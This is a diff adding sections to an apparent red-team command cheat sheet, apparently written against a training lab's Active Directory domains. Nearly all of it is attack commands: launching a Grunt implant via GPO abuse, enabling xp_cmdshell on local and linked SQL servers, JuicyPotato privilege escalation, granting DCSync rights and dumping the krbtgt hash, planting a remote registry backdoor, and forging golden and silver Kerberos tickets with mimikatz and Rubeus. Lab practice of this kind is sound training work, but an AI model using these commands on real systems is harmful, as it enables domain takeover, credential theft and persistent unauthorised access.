@@ -258,6 +258,102 @@ Upload /filepath:"Grunt.exe"
 cmd.exe /c \\fs-1\software\Grunt.exe
 Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\Grunt.exe\" --GPOName \"Rasta GPO\""
 
+#MSSQLServers
+MakeToken svc_mssql cyberbotic.io REDACTED
+PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
+PowerShell Get-SQLServerInfo -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@servername'
+PowerShell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
+proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
+
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE
+
+MS SQL Lateral Movement
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select * from sys.configurations where name = ''xp_cmdshell''')
+
+MS SQL Privilege Escalation
+powershell_import /tmp/PowerUp.ps1
+powershell_execute Invoke-PrivescAudit
+execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
+
+#Domain Dominance Add-DomainObjectAcl 
+DCSync krbtgt
+lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
+PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync
+DCSync krbtgt
+lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
+
+#Remote Registry Backdoor
+PowerShell Add-RemoteRegBackdoor -ComputerName dc-1 -Trustee CYBER\s.ball
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
+
+#Golden Tickets
+ls \\dc-1\c$
+kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:golden.kirbi
+.user is the username to impersonate
+.domain is the FQDN of the current domain
+.sid is the SID of the current domain
+.krbtgt is the NTLM hash of the krbtgt account
+.ticket is the filename to save as
+mimikatz # kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
+Rubeus ptt /ticket:[...snip...]
+
+# Silver Tickets
+Rubeus ptt /ticket:[...snip...]
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
+
+#Domain Trusts
+One-Way Domain Trust
+Bidirectional Domain Trust
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
